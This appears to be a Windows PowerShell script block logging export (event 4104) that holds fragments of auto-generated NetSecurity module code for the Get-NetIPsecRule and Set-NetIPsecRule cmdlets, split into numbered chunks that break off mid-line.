    [Parameter(ParameterSetName='ByIPsecRuleName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByDisplayGroup')]
    [Parameter(ParameterSetName='ByGroup')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [string]
    ${RemoteTunnelHostname},

    [Parameter(ParameterSetName='ByIPsecRuleName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByDisplayGroup')]
    [Parameter(ParameterSetName='ByGroup')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [uint32]
    ${ForwardPathLifetime},

    [Parameter(ParameterSetName='ByIPsecRuleName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByDisplayGroup')]
    [Parameter(ParameterSetName='ByGroup')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [bool]
    ${EncryptedTunnelBypass},

    [Parameter(ParameterSetName='ByIPsecRuleName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByDisplayGroup')]
    [Parameter(ParameterSetName='ByGroup')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [bool]
    ${RequireAuthorization},

    [Parameter(ParameterSetName='ByIPsecRuleName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByDisplayGroup')]
    [Parameter(ParameterSetName='ByGroup')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [string]
    ${User},

    [Parameter(ParameterSetName='ByIPsecRuleName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByDisplayGroup')]
    [Parameter(ParameterSetName='ByGroup')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [string]
    ${Machine},

    [Parameter(ParameterSetName='ByIPsecRuleName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByDisplayGroup')]
    [Parameter(ParameterSetName='ByGroup')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [string[]]
    ${LocalAddress},

    [Parameter(ParameterSetName='ByIPsecRuleName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByDisplayGroup')]
    [Parameter(ParameterSetName='ByGroup')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [string[]]
    ${RemoteAddress},

    [Parameter(ParameterSetName='ByIPsecRuleName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByDisplayGroup')]
    [Parameter(ParameterSetName='ByGroup')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [string]
    ${Protocol},

    [Parameter(ParameterSetName='ByIPsecRuleName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByDisplayGroup')]
    [Parameter(ParameterSetName='ByGroup')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [string[]]
    ${LocalPort},

    [Parameter(ParameterSetName='ByIPsecRuleName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByDisplayGroup')]
    [Parameter(ParameterSetName='ByGroup')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [string[]]
    ${RemotePort},

    [Parameter(ParameterSetName='ByIPsecRuleName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByDisplayGroup')]
    [Parameter(ParameterSetName='ByGroup')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [WildcardPattern[]]
    ${InterfaceAlias},

    [Parameter(ParameterSetName='ByIPsecRuleName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByDisplayGroup')]
    [Parameter(ParameterSetName='ByGroup')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.InterfaceType]
    ${InterfaceType},

    [Parameter(ParameterSetName='ByIPsecRuleName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByDisplayGroup')]
    [Parameter(ParameterSetName='ByGroup')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [Alias('Session')]
    [ValidateNotNullOrEmpty()]
    [CimSession[]]
    ${CimSession},

    [Parameter(ParameterSetName='ByIPsecRuleName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByDisplayGroup')]
    [Parameter(ParameterSetName='ByGroup')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [int]
    ${ThrottleLimit},

    [Parameter(ParameterSetName='ByIPsecRuleName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByDisplayGroup')]
    [Parameter(ParameterSetName='ByGroup')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [switch]
    ${AsJob},

    [Parameter(ParameterSetName='ByIPsecRuleName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByDisplayGroup')]
    [Parameter(ParameterSetName='ByGroup')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [switch]
    ${PassThru})

    DynamicParam {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper = $script:ObjectModelWrapper::new()
                $__cmdletization_objectModelWrapper.Initialize($PSCmdlet, $script:ClassName, $script:ClassVersion, $script:ModuleVersion, $script:PrivateData)

                if ($__cmdletization_objectModelWrapper -is [System.Management.Automation.IDynamicParameters])
                {
                    ([System.Management.Automation.IDynamicParameters]$__cmdletization_objectModelWrapper).GetDynamicParameters()
                }
            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }

    Begin {
        $__cmdletization_exceptionHasBeenThrown = $false
        try 
        {
            __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper $PSBoundParameters
            $__cmdletization_objectModelWrapper.BeginProcessing()
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    Process {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
    $__cmdletization_queryBuilder = $__cmdletization_objectModelWrapper.GetQueryBuilder()
    if ($PSBoundParameters.ContainsKey('IPsecRuleName') -and (@('ByIPsecRuleName') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${IPsecRuleName})
        $__cmdletization_queryBuilder.FilterByProperty('InstanceID', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('DisplayName') -and (@('ByDisplayName') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${DisplayName})
        $__cmdletization_queryBuilder.FilterByProperty('DisplayName', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('DisplayGroup') -and (@('ByDisplayGroup') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${DisplayGroup})
        $__cmdletization_queryBuilder.FilterByProperty('DisplayGroup', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('Group') -and (@('ByGroup') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Group})
        $__cmdletization_queryBuilder.FilterByProperty('RuleGroup', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('PolicyStore') -and (@('ByIPsecRuleName', 'ByDisplayName', 'ByDisplayGroup', 'ByGroup') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.AddQueryOption('PolicyStore', ${PolicyStore})
    }
    if ($PSBoundParameters.ContainsKey('GPOSession') -and (@('ByIPsecRuleName', 'ByDisplayName', 'ByDisplayGroup', 'ByGroup') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.AddQueryOption('GPOSession', ${GPOSession})
    }


    $__cmdletization_methodParameters = [System.Collections.Generic.List[Microsoft.PowerShell.Cmdletization.MethodParameter]]::new()
    switch -exact ($PSCmdlet.ParameterSetName) { 
        { @('ByIPsecRuleName', 'ByDisplayName', 'ByDisplayGroup', 'ByGroup', 'InputObject (cdxml)') -contains $_ } {
          [object]$__cmdletization_defaultValue = $null
          [object]$__cmdletization_defaultValueIsPresent = $false
          if ($PSBoundParameters.ContainsKey('NewDisplayName')) {
            [object]$__cmdletization_value = ${NewDisplayName}
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ElementName'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
          } else {
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ElementName'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
          }
          $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

          [object]$__cmdletization_defaultValue = $null
          [object]$__cmdletization_defaultValueIsPresent = $false
          if ($PSBoundParameters.ContainsKey('Description')) {
            [object]$__cmdletization_value = ${Description}
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Description'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
          } else {
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Description'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
          }
          $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

          [object]$__cmdletization_defaultValue = $null
          [object]$__cmdletization_defaultValueIsPresent = $false
          if ($PSBoundParameters.ContainsKey('Enabled')) {
            [object]$__cmdletization_value = ${Enabled}
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Enabled'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.Enabled'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
          } else {
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Enabled'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.Enabled'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
          }
          $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

          [object]$__cmdletization_defaultValue = $null
          [object]$__cmdletization_defaultValueIsPresent = $false
          if ($PSBoundParameters.ContainsKey('Profile')) {
            [object]$__cmdletization_value = ${Profile}
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Profiles'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.Profile'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
          } else {
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Profiles'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.Profile'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
          }
          $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

          [object]$__cmdletization_defaultValue = $null
          [object]$__cmdletization_defaultValueIsPresent = $false
          if ($PSBoundParameters.ContainsKey('Platform')) {
            [object]$__cmdletization_value = ${Platform}
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Platforms'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
          } else {
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Platforms'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; Is

ScriptBlock ID: a288637f-963a-46d5-a838-bde2dae2141e
Path: "
"07-08-2025 18:31:34","4104","Warning","Creating Scriptblock text (6 of 23):
ifetimeSeconds', $__cmdletization_values, $false, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('EncryptedTunnelBypass') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${EncryptedTunnelBypass})
        $__cmdletization_queryBuilder.FilterByProperty('BypassTunnelIfEncrypted', $__cmdletization_values, $false, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('RequireAuthorization') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${RequireAuthorization})
        $__cmdletization_queryBuilder.FilterByProperty('RequireAuthorization', $__cmdletization_values, $false, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('User') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${User})
        $__cmdletization_queryBuilder.FilterByProperty('Users', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('Machine') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Machine})
        $__cmdletization_queryBuilder.FilterByProperty('Machines', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('PrimaryStatus') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${PrimaryStatus})
        $__cmdletization_queryBuilder.FilterByProperty('PrimaryStatus', $__cmdletization_values, $false, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('Status') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Status})
        $__cmdletization_queryBuilder.FilterByProperty('Status', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('PolicyStoreSource') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${PolicyStoreSource})
        $__cmdletization_queryBuilder.FilterByProperty('PolicyStoreSource', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('PolicyStoreSourceType') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${PolicyStoreSourceType})
        $__cmdletization_queryBuilder.FilterByProperty('PolicyStoreSourceType', $__cmdletization_values, $false, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('AssociatedNetFirewallAddressFilter') -and (@('ByAssociatedNetFirewallAddressFilter') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.FilterByAssociatedInstance(${AssociatedNetFirewallAddressFilter}, 'MSFT_NetConSecRuleFilterByAddress', 'PartComponent', 'GroupComponent', 'Default')
    }
    if ($PSBoundParameters.ContainsKey('AssociatedNetFirewallInterfaceFilter') -and (@('ByAssociatedNetFirewallInterfaceFilter') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.FilterByAssociatedInstance(${AssociatedNetFirewallInterfaceFilter}, 'MSFT_NetConSecRuleFilterByInterface', 'PartComponent', 'GroupComponent', 'Default')
    }
    if ($PSBoundParameters.ContainsKey('AssociatedNetFirewallInterfaceTypeFilter') -and (@('ByAssociatedNetFirewallInterfaceTypeFilter') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.FilterByAssociatedInstance(${AssociatedNetFirewallInterfaceTypeFilter}, 'MSFT_NetConSecRuleFilterByInterfaceType', 'PartComponent', 'GroupComponent', 'Default')
    }
    if ($PSBoundParameters.ContainsKey('AssociatedNetFirewallPortFilter') -and (@('ByAssociatedNetFirewallPortFilter') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.FilterByAssociatedInstance(${AssociatedNetFirewallPortFilter}, 'MSFT_NetConSecRuleFilterByProtocolPort', 'PartComponent', 'GroupComponent', 'Default')
    }
    if ($PSBoundParameters.ContainsKey('AssociatedNetFirewallProfile') -and (@('ByAssociatedNetFirewallProfile') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.FilterByAssociatedInstance(${AssociatedNetFirewallProfile}, 'MSFT_NetConSecRuleInProfile', 'GroupComponent', 'PartComponent', 'Default')
    }
    if ($PSBoundParameters.ContainsKey('AssociatedNetIPsecPhase2AuthSet') -and (@('ByAssociatedNetIPsecPhase2AuthSet') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.FilterByAssociatedInstance(${AssociatedNetIPsecPhase2AuthSet}, 'MSFT_NetConSecRuleEMAuthSet', 'PartComponent', 'GroupComponent', 'Default')
    }
    if ($PSBoundParameters.ContainsKey('AssociatedNetIPsecPhase1AuthSet') -and (@('ByAssociatedNetIPsecPhase1AuthSet') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.FilterByAssociatedInstance(${AssociatedNetIPsecPhase1AuthSet}, 'MSFT_NetConSecRuleMMAuthSet', 'PartComponent', 'GroupComponent', 'Default')
    }
    if ($PSBoundParameters.ContainsKey('AssociatedNetIPsecQuickModeCryptoSet') -and (@('ByAssociatedNetIPsecQuickModeCryptoSet') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.FilterByAssociatedInstance(${AssociatedNetIPsecQuickModeCryptoSet}, 'MSFT_NetConSecRuleQMCryptoSet', 'PartComponent', 'GroupComponent', 'Default')
    }
    if ($PSBoundParameters.ContainsKey('All') -and (@('GetAll') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.AddQueryOption('All', ${All})
    }
    if ($PSBoundParameters.ContainsKey('PolicyStore') -and (@('ByIPsecRuleName', 'ByDisplayName', 'ByQuery', 'ByAssociatedNetFirewallAddressFilter', 'ByAssociatedNetFirewallInterfaceFilter', 'ByAssociatedNetFirewallInterfaceTypeFilter', 'ByAssociatedNetFirewallPortFilter', 'ByAssociatedNetFirewallProfile', 'ByAssociatedNetIPsecPhase2AuthSet', 'ByAssociatedNetIPsecPhase1AuthSet', 'ByAssociatedNetIPsecQuickModeCryptoSet', 'GetAll') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.AddQueryOption('PolicyStore', ${PolicyStore})
    }
    if ($PSBoundParameters.ContainsKey('GPOSession') -and (@('ByIPsecRuleName', 'ByDisplayName', 'ByQuery', 'ByAssociatedNetFirewallAddressFilter', 'ByAssociatedNetFirewallInterfaceFilter', 'ByAssociatedNetFirewallInterfaceTypeFilter', 'ByAssociatedNetFirewallPortFilter', 'ByAssociatedNetFirewallProfile', 'ByAssociatedNetIPsecPhase2AuthSet', 'ByAssociatedNetIPsecPhase1AuthSet', 'ByAssociatedNetIPsecQuickModeCryptoSet', 'GetAll') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.AddQueryOption('GPOSession', ${GPOSession})
    }
    if ($PSBoundParameters.ContainsKey('TracePolicyStore') -and (@('ByIPsecRuleName', 'ByDisplayName', 'ByQuery', 'ByAssociatedNetFirewallAddressFilter', 'ByAssociatedNetFirewallInterfaceFilter', 'ByAssociatedNetFirewallInterfaceTypeFilter', 'ByAssociatedNetFirewallPortFilter', 'ByAssociatedNetFirewallProfile', 'ByAssociatedNetIPsecPhase2AuthSet', 'ByAssociatedNetIPsecPhase1AuthSet', 'ByAssociatedNetIPsecQuickModeCryptoSet', 'GetAll') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.AddQueryOption('TracePolicyStore', ${TracePolicyStore})
    }


    $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_queryBuilder)
            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    End {
        try
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper.EndProcessing()
            }
        }
        catch
        {
            throw
        }
    }

    # .EXTERNALHELP NetIPsecRule.cmdletDefinition.cdxml-Help.xml
}
Microsoft.PowerShell.Core\Export-ModuleMember -Function 'Get-NetIPsecRule' -Alias '*'
        

function Set-NetIPsecRule
{
    [CmdletBinding(SupportsShouldProcess=$true, ConfirmImpact='Medium', PositionalBinding=$false)]
    
    [OutputType([Microsoft.Management.Infrastructure.CimInstance])]
[OutputType('Microsoft.Management.Infrastructure.CimInstance#root/standardcimv2/MSFT_NetConSecRule')]

    param(
    
    [Parameter(ParameterSetName='ByIPsecRuleName', Mandatory=$true, Position=0, ValueFromPipelineByPropertyName=$true)]
    [Alias('ID','Name')]
    [ValidateNotNull()]
    [string[]]
    ${IPsecRuleName},

    [Parameter(ParameterSetName='ByDisplayName', Mandatory=$true)]
    [ValidateNotNull()]
    [string[]]
    ${DisplayName},

    [Parameter(ParameterSetName='ByDisplayGroup', Mandatory=$true)]
    [ValidateNotNull()]
    [string[]]
    ${DisplayGroup},

    [Parameter(ParameterSetName='ByGroup', Mandatory=$true)]
    [ValidateNotNull()]
    [string[]]
    ${Group},

    [Parameter(ParameterSetName='ByIPsecRuleName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByDisplayGroup')]
    [Parameter(ParameterSetName='ByGroup')]
    [string]
    ${PolicyStore},

    [Parameter(ParameterSetName='ByIPsecRuleName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByDisplayGroup')]
    [Parameter(ParameterSetName='ByGroup')]
    [string]
    ${GPOSession},

    [Parameter(ParameterSetName='InputObject (cdxml)', Mandatory=$true, ValueFromPipeline=$true)]
    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#MSFT_NetConSecRule')]
    [ValidateNotNull()]
    [ciminstance[]]
    ${InputObject},

    [Parameter(ParameterSetName='ByIPsecRuleName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByDisplayGroup')]
    [Parameter(ParameterSetName='ByGroup')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [string]
    ${NewDisplayName},

    [Parameter(ParameterSetName='ByIPsecRuleName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByDisplayGroup')]
    [Parameter(ParameterSetName='ByGroup')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [string]
    ${Description},

    [Parameter(ParameterSetName='ByIPsecRuleName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByDisplayGroup')]
    [Parameter(ParameterSetName='ByGroup')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.Enabled]
    ${Enabled},

    [Parameter(ParameterSetName='ByIPsecRuleName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByDisplayGroup')]
    [Parameter(ParameterSetName='ByGroup')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.Profile]
    ${Profile},

    [Parameter(ParameterSetName='ByIPsecRuleName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByDisplayGroup')]
    [Parameter(ParameterSetName='ByGroup')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [string[]]
    ${Platform},

    [Parameter(ParameterSetName='ByIPsecRuleName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByDisplayGroup')]
    [Parameter(ParameterSetName='ByGroup')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.IPsecMode]
    ${Mode},

    [Parameter(ParameterSetName='ByIPsecRuleName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByDisplayGroup')]
    [Parameter(ParameterSetName='ByGroup')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [Alias('SecIn')]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.SecurityPolicy]
    ${InboundSecurity},

    [Parameter(ParameterSetName='ByIPsecRuleName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByDisplayGroup')]
    [Parameter(ParameterSetName='ByGroup')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [Alias('SecOut')]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.SecurityPolicy]
    ${OutboundSecurity},

    [Parameter(ParameterSetName='ByIPsecRuleName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByDisplayGroup')]
    [Parameter(ParameterSetName='ByGroup')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [string]
    ${QuickModeCryptoSet},

    [Parameter(ParameterSetName='ByIPsecRuleName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByDisplayGroup')]
    [Parameter(ParameterSetName='ByGroup')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [string]
    ${Phase1AuthSet},

    [Parameter(ParameterSetName='ByIPsecRuleName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByDisplayGroup')]
    [Parameter(ParameterSetName='ByGroup')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [string]
    ${Phase2AuthSet},

    [Parameter(ParameterSetName='ByIPsecRuleName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByDisplayGroup')]
    [Parameter(ParameterSetName='ByGroup')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.KeyModule]
    ${KeyModule},

    [Parameter(ParameterSetName='ByIPsecRuleName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByDisplayGroup')]
    [Parameter(ParameterSetName='ByGroup')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [bool]
    ${AllowWatchKey},

    [Parameter(ParameterSet

ScriptBlock ID: a288637f-963a-46d5-a838-bde2dae2141e
Path: "
"07-08-2025 18:31:34","4104","Warning","Creating Scriptblock text (5 of 23):
)]
    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#root/standardcimv2/MSFT_NetAddressFilter')]
    [ValidateNotNull()]
    [ciminstance]
    ${AssociatedNetFirewallAddressFilter},

    [Parameter(ParameterSetName='ByAssociatedNetFirewallInterfaceFilter', Mandatory=$true, ValueFromPipeline=$true)]
    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#root/standardcimv2/MSFT_NetInterfaceFilter')]
    [ValidateNotNull()]
    [ciminstance]
    ${AssociatedNetFirewallInterfaceFilter},

    [Parameter(ParameterSetName='ByAssociatedNetFirewallInterfaceTypeFilter', Mandatory=$true, ValueFromPipeline=$true)]
    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#root/standardcimv2/MSFT_NetInterfaceTypeFilter')]
    [ValidateNotNull()]
    [ciminstance]
    ${AssociatedNetFirewallInterfaceTypeFilter},

    [Parameter(ParameterSetName='ByAssociatedNetFirewallPortFilter', Mandatory=$true, ValueFromPipeline=$true)]
    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#root/standardcimv2/MSFT_NetProtocolPortFilter')]
    [ValidateNotNull()]
    [ciminstance]
    ${AssociatedNetFirewallPortFilter},

    [Parameter(ParameterSetName='ByAssociatedNetFirewallProfile', Mandatory=$true, ValueFromPipeline=$true)]
    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#root/standardcimv2/MSFT_NetFirewallProfile')]
    [ValidateNotNull()]
    [ciminstance]
    ${AssociatedNetFirewallProfile},

    [Parameter(ParameterSetName='ByAssociatedNetIPsecPhase2AuthSet', Mandatory=$true, ValueFromPipeline=$true)]
    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#root/standardcimv2/MSFT_NetIKEP2AuthSet')]
    [ValidateNotNull()]
    [ciminstance]
    ${AssociatedNetIPsecPhase2AuthSet},

    [Parameter(ParameterSetName='ByAssociatedNetIPsecPhase1AuthSet', Mandatory=$true, ValueFromPipeline=$true)]
    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#root/standardcimv2/MSFT_NetIKEP1AuthSet')]
    [ValidateNotNull()]
    [ciminstance]
    ${AssociatedNetIPsecPhase1AuthSet},

    [Parameter(ParameterSetName='ByAssociatedNetIPsecQuickModeCryptoSet', Mandatory=$true, ValueFromPipeline=$true)]
    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#root/standardcimv2/MSFT_NetIKEQMCryptoSet')]
    [ValidateNotNull()]
    [ciminstance]
    ${AssociatedNetIPsecQuickModeCryptoSet},

    [Parameter(ParameterSetName='GetAll')]
    [switch]
    ${All},

    [Parameter(ParameterSetName='ByIPsecRuleName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallAddressFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallInterfaceFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallInterfaceTypeFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallPortFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallProfile')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecPhase2AuthSet')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecPhase1AuthSet')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecQuickModeCryptoSet')]
    [Parameter(ParameterSetName='GetAll')]
    [string]
    ${PolicyStore},

    [Parameter(ParameterSetName='ByIPsecRuleName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
